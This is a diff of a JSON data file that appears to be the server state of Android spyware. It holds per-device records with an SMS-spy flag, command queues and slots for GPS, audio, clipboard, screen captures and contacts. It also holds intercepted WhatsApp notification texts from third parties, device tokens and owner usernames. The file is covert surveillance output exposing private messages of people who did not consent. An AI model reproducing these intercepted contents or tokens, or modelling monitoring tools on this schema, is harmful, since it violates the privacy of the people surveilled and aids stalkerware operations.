@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2251 pesan dari 17 chat",
+        "time": "29/04 17:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777454827991
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (2 pesan): ~ ~ n",
         "content": "💟 Stiker",
         "time": "29/04 17:38",
@@ -4011,14 +4019,6 @@
         "time": "29/04 17:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1777454210410
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (609 pesan): ~ All Deku",
-        "content": "📷 Wts akun ml allkoss nominus take sgmail polos fresh\nOp 380k negoin kalo kemahalan Bu bet gw\nTanya spek ke pm",
-        "time": "29/04 17:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777454209140
       }
     ],
     "galleryPhotos": [],
@@ -17857,6 +17857,38 @@
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T09:24:37.837Z",
+    "deviceInfo": {
+      "model": "TECNO MOBILE LIMITED TECNO LE7",
+      "androidVersion": "Android 11",
+      "battery": 65,
+      "network": "Seluler: Indosat Ooredoo",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
+  },
+  {
+    "deviceId": "aimlock_4309eaed",
+    "deviceName": "HP-ZAL7SEX-4812",
+    "ownerUsername": "Zal7Sex",
+    "token": "d78aff42ead33e10640c5a49e789cd45",
+    "lastSeen": 1777454830877,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-29T09:27:10.877Z",
     "deviceInfo": {
       "model": "TECNO MOBILE LIMITED TECNO LE7",
       "androidVersion": "Android 11",
